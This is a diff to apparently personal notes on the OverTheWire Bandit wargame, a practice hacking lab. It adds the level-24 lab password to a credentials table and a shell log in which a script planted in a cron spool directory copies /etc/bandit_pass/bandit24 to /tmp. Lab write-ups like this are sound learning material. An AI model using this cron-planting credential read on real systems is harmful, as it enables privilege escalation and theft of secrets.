@@ -26,6 +26,7 @@ level | URL | port | login | pass | Notes
 21 | bandit.labs.overthewire.org | 2220 | bandit21 | gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr | [bandit 21](https://overthewire.org/wargames/bandit/bandit22.html) |
 22 | bandit.labs.overthewire.org | 2220 | bandit22 | Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI | [bandit 22](https://overthewire.org/wargames/bandit/bandit23.html) |
 23 | bandit.labs.overthewire.org | 2220 | bandit23 | jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n | [bandit 23](https://overthewire.org/wargames/bandit/bandit24.html) |
+24 | bandit.labs.overthewire.org | 2220 | bandit24 | UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ | [bandit 24](https://overthewire.org/wargames/bandit/bandit25.html) |
 
 
 ## Level 0
@@ -478,4 +479,24 @@ do
 done
 
 bandit23@bandit:~$
+-----------
+bandit23@bandit:~$ mkdir /tmp/bandit23_pithei
+cd /tmp/bandit23_pithei
+bandit23@bandit:/tmp/bandit23_pithei$ cat > bandit23_pithei.sh
+#!/bin/bash
+echo "Copying passwordfile /etc/bandit_pass/bandit24 to /tmp/pithei_bandit23_to_24"
+
+cat /etc/bandit_pass/bandit24 > /tmp/pithei_bandit23_to_24
+bandit23@bandit:/tmp/bandit23_pithei$ chmod +x bandit23_pithei.sh
+bandit23@bandit:/tmp/bandit23_pithei$ cp bandit23_pithei.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/bandit23_pithei$ file /var/spool/bandit24/bandit23_pithei.sh
+/var/spool/bandit24/bandit23_pithei.sh: cannot open `/var/spool/bandit24/bandit23_pithei.sh' (No such file or directory)
+bandit23@bandit:/tmp/bandit23_pithei$ file /var/spool/bandit24/bandit23_pithei.sh
+/var/spool/bandit24/bandit23_pithei.sh: cannot open `/var/spool/bandit24/bandit23_pithei.sh' (No such file or directory)
+bandit23@bandit:/tmp/bandit23_pithei$ file /tmp/pithei_bandit23_to_24
+/tmp/pithei_bandit23_to_24: ASCII text
+bandit23@bandit:/tmp/bandit23_pithei$ cat file /tmp/pithei_bandit23_to_24
+cat: file: No such file or directory
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:/tmp/bandit23_pithei$
 ```
